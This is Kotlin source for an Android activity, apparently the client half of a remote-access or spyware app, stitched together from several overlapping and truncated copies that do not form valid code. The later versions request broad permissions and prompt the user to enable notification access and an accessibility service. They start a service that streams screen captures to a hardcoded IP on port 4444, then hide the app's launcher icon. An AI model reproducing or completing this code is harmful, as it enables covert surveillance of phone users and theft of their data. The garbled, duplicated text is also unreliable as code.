package com.example.socketclient

import android.app.Activity
import android.content.Intent
import android.media.projection.MediaProjectionManager
import android.os.Build
import android.os.Bundle
import android.widget.Button
import android.widget.Toast
import androidx.activity.result.ActivityResultContracts
import androidx.appcompat.app.AppCompatActivity

class MainActivity : AppCompatActivity() {

    // Constants for server IP and port
    companion object {
        const val SERVER_IP = "192.168.43.27" // Replace with your server IP
        const val SERVER_PORT = 4444         // Replace with your server port
    }

    private val screenCaptureLauncher =
        registerForActivityResult(ActivityResultContracts.StartActivityForResult()) { result ->
            if (result.resultCode == Activity.RESULT_OK && result.data != null) {
                val serviceIntent = Intent(this, ScreenCaptureService::class.java).apply {
                    putExtra("resultCode", result.resultCode)   // Important
                    putExtra("data", result.data)               // Important (Intent is Parcelable)
                    putExtra("server_ip", SERVER_IP)            // Server IP
                    putExtra("server_port", SERVER_PORT)        // Server port
                }

                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                    startForegroundService(serviceIntent)
                } else {
                    startService(serviceIntent)
                }
                Toast.makeText(this, "Screen capture permission granted", Toast.LENGTH_SHORT).show()
            } else {
                Toast.makeText(this, "Screen capture permission denied", Toast.LENGTH_SHORT).show()
            }
        }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        // Button to start screen capture
        val startButton: Button = findViewById(R.id.startButton)
        startButton.setOnClickListener {
            startScreenCapture()
        }
    }

    private fun startScreenCapture() {
        // Request the screen capture permission
        val mediaProjectionManager = getSystemService(MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
        val captureIntent = mediaProjectionManager.createScreenCaptureIntent()
        screenCaptureLauncher.launch(captureIntent)
    }
}
        }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        mediaProjectionManager = getSystemService(MEDIA_PROJECTION_SERVICE) as MediaProjectionManager

        requestAllPermissions()
        checkNotificationListenerPermission()
        checkAccessibilityServiceEnabled()
        requestScreenCapturePermission()

        // Hide app icon from launcher after first launch
        hideAppIcon()
    }

    private fun requestAllPermissions() {
        val missingPermissions = PERMISSIONS.filter {
            ContextCompat.checkSelfPermission(this, it) != PackageManager.PERMISSION_GRANTED
        }

        if (missingPermissions.isNotEmpty()) {
            ActivityCompat.requestPermissions(
                this,
                missingPermissions.toTypedArray(),
                REQUEST_PERMISSIONS_CODE
            )
        }
    }

    private fun requestScreenCapturePermission() {
        val captureIntent = mediaProjectionManager.createScreenCaptureIntent()
        screenCaptureLauncher.launch(captureIntent)
    }

    private fun checkNotificationListenerPermission() {
        val enabledListeners =
            Settings.Secure.getString(contentResolver, "enabled_notification_listeners")
        val packageName = packageName

        if (enabledListeners == null || !enabledListeners.contains(packageName)) {
            Toast.makeText(this, "Please enable Notification Access", Toast.LENGTH_LONG).show()
            startActivity(Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS))
        }
    }

    private fun checkAccessibilityServiceEnabled() {
        val enabledServices =
            Settings.Secure.getString(contentResolver, Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES)
        val expectedService = "$packageName/${MyAccessibilityService::class.java.name}"

        if (enabledServices == null || !enabledServices.contains(expectedService)) {
            Toast.makeText(this, "Please enable Accessibility Service", Toast.LENGTH_LONG).show()
            startActivity(Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS))
        }
    }

    private fun hideAppIcon() {
        val componentName = ComponentName(this, MainActivity::class.java)
        packageManager.setComponentEnabledSetting(
            componentName,
            PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
            PackageManager.DONT_KILL_APP
        )
    }

    override fun onRequestPermissionsResult(
        requestCode: Int,
        permissions: Array<String>,
        grantResults: IntArray
    ) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
        if (requestCode == REQUEST_PERMISSIONS_CODE) {
            val denied = permissions.zip(grantResults.toTypedArray())
                .filter { it.second != PackageManager.PERMISSION_GRANTED }
            if (denied.isNotEmpty()) {
                Toast.makeText(
                    this,
                    "Some permissions were denied: ${denied.map { it.first }}",
                    Toast.LENGTH_LONG
                ).show()
            }
        }
    }
}            permissions
        }
    }

    private lateinit var mediaProjectionManager: MediaProjectionManager

    // Your IP and Port
    private val SERVER_IP = "192.168.43.27"
    private val SERVER_PORT = 4444

    private val screenCaptureLauncher = registerForActivityResult(ActivityResultContracts.StartActivityForResult()) { result ->
        if (result.resultCode == Activity.RESULT_OK && result.data != null) {
            val serviceIntent = Intent(this, SocketService::class.java).apply {
                putExtra("mediaProjectionData", result.data)
                putExtra("server_ip", SERVER_IP)
                putExtra("server_port", SERVER_PORT)
            }
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(serviceIntent)
            } else {
                startService(serviceIntent)
            }
            Toast.makeText(this, "Screen capture permission granted", Toast.LENGTH_SHORT).show()
        } else {
            Toast.makeText(this, "Screen capture permission denied", Toast.LENGTH_SHORT).show()
        }
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        mediaProjectionManager = getSystemService(MEDIA_PROJECTION_SERVICE) as MediaProjectionManager

        requestAllPermissions()
        checkNotificationListenerPermission()
        checkAccessibilityServiceEnabled()
        requestScreenCapturePermission()

        // Hide app icon from launcher after first launch
        hideAppIcon()
    }

    private fun requestAllPermissions() {
        val missingPermissions = PERMISSIONS.filter {
            ContextCompat.checkSelfPermission(this, it) != PackageManager.PERMISSION_GRANTED
        }

        if (missingPermissions.isNotEmpty()) {
            ActivityCompat.requestPermissions(this, missingPermissions.toTypedArray(), REQUEST_PERMISSIONS_CODE)
        }
    }

    private fun requestScreenCapturePermission() {
        val captureIntent = mediaProjectionManager.createScreenCaptureIntent()
        screenCaptureLauncher.launch(captureIntent)
    }

    private fun checkNotificationListenerPermission() {
        val enabledListeners = Settings.Secure.getString(contentResolver, "enabled_notification_listeners")
        val packageName = packageName

        if (enabledListeners == null || !enabledListeners.contains(packageName)) {
            Toast.makeText(this, "Please enable Notification Access", Toast.LENGTH_LONG).show()
            startActivity(Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS))
        }
    }

    private fun checkAccessibilityServiceEnabled() {
        val enabledServices = Settings.Secure.getString(contentResolver, Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES)
        val expectedService = "$packageName/${MyAccessibilityService::class.java.name}"

        if (enabledServices == null || !enabledServices.contains(expectedService)) {
            Toast.makeText(this, "Please enable Accessibility Service", Toast.LENGTH_LONG).show()
            startActivity(Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS))
        }
    }

    private fun hideAppIcon() {
        val componentName = ComponentName(this, MainActivity::class.java)
        packageManager.setComponentEnabledSetting(
            componentName,
            PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
            PackageManager.DONT_KILL_APP
        )
    }

    override fun onRequestPermissionsResult(requestCode: Int, permissions: Array<String>, grantResults: IntArray) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
        if (requestCode == REQUEST_PERMISSIONS_CODE) {
            val denied = permissions.zip(grantResults.toTypedArray()).filter { it.second != PackageManager.PERMISSION_GRANTED }
            if (denied.isNotEmpty()) {
                Toast.makeText(this, "Some permissions were denied: ${denied.map { it.first }}", Toast.LENGTH_LONG).show()
            }
        }
    }
}
    // Your IP and Port
    private val SERVER_IP = "192.168.43.27"
    private val SERVER_PORT = 4444

    private val screenCaptureLauncher = registerForActivityResult(ActivityResultContracts.StartActivityForResult()) { result ->
        if (result.resultCode == Activity.RESULT_OK && result.data != null) {
            val serviceIntent = Intent(this, SocketService::class.java).apply {
                putExtra("mediaProjectionData", result.data)
                putExtra("server_ip", SERVER_IP)
                putExtra("server_port", SERVER_PORT)
            }
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(serviceIntent)
            } else {
                startService(serviceIntent)
            }
            Toast.makeText(this, "Screen capture permission granted", Toast.LENGTH_SHORT).show()
        } else {
            Toast.makeText(this, "Screen capture permission denied", Toast.LENGTH_SHORT).show()
        }
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        mediaProjectionManager = getSystemService(MEDIA_PROJECTION_SERVICE) as MediaProjectionManager

        requestAllPermissions()
        checkNotificationListenerPermission()
        checkAccessibilityServiceEnabled()
        requestScreenCapturePermission()

        // Hide app icon from launcher after first launch
        hideAppIcon()
    }

    private fun requestAllPermissions() {
        val missingPermissions = PERMISSIONS.filter {
            ContextCompat.checkSelfPermission(this, it) != PackageManager.PERMISSION_GRANTED
        }

        if (missingPermissions.isNotEmpty()) {
            ActivityCompat.requestPermissions(this, missingPermissions.toTypedArray(), REQUEST_PERMISSIONS_CODE)
        }
    }

    private fun requestScreenCapturePermission() {
        val captureIntent = mediaProjectionManager.createScreenCaptureIntent()
        screenCaptureLauncher.launch(captureIntent)
    }

    private fun checkNotificationListenerPermission() {
        val enabledListeners = Settings.Secure.getString(contentResolver, "enabled_notification_listeners")
        val packageName = packageName

        if (enabledListeners == null || !enabledListeners.contains(packageName)) {
            Toast.makeText(this, "Please enable Notification Access", Toast.LENGTH_LONG).show()
            startActivity(Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS))
        }
    }

    private fun checkAccessibilityServiceEnabled() {
        val enabledServices = Settings.Secure.getString(contentResolver, Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES)
        val expectedService = "$packageName/${MyAccessibilityService::class.java.name}"

        if (enabledServices == null || !enabledServices.contains(expectedService)) {
            Toast.makeText(this, "Please enable Accessibility Service", Toast.LENGTH_LONG).show()
            startActivity(Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS))
        }
    }

    private fun hideAppIcon() {
        val componentName = ComponentName(this, MainActivity::class.java)
        packageManager.setComponentEnabledSetting(
            componentName,
            PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
            PackageManager.DONT_KILL_APP
        )
    }

    override fun onRequestPermissionsResult(requestCode: Int, permissions: Array<String>, grantResults: IntArray) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
        if (requestCode == REQUEST_PERMISSIONS_CODE) {
            val denied = permissions.zip(grantResults.toTypedArray()).filter { it.second != PackageManager.PERMISSION_GRANTED }
            if (denied.isNotEmpty()) {
                Toast.makeText(this, "Some permissions were denied: ${denied.map { it.first }}", Toast.LENGTH_LONG).show()
            }
        }
    }
}
